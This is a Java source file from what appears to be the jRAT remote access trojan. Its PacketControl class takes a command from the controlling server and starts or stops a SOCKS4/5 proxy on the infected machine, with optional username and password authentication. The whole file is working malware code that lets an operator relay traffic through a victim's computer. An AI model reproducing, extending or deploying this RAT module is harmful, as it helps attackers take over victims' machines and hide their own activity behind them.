package jrat.module.socks.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.module.socks.SocksClientModule;
import socks.ProxyServer;
import socks.server.ServerAuthenticatorNone;
import socks.server.UserPasswordAuthenticator;
import socks.server.UserValidation;

import java.net.Socket;

public class PacketControl implements IncomingPacket {

    public void read(Connection con) throws Exception {
        boolean start = con.readBoolean();

        if (start) {
            final boolean socks5 = con.readBoolean();
            final String host = con.readLine();
            final int port = con.readInt();
            final boolean auth = con.readBoolean();
            final String user = con.readLine();
            final String pass = con.readLine();

            new Thread(new Runnable() {
                public void run() {
                    try {
                        ProxyServer server = new ProxyServer(socks5 && auth ? new UserPasswordAuthenticator(new UserValidation() {
                            @Override
                            public boolean isUserValid(String username, String password, Socket connection) {
                                if (!auth) {
                                    return true;
                                }
                                return username.equals(user) && password.equals(pass);
                            }
                        }) : new ServerAuthenticatorNone());
                        ProxyServer.setLog(System.out);
                        SocksClientModule.server = server;
                        System.out.println(host + ":" + port);
                        server.start(port, 5, host);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        } else {
            if (SocksClientModule.server != null) {
                SocksClientModule.server.stop();
                SocksClientModule.server = null;
            }
        }
    }
}
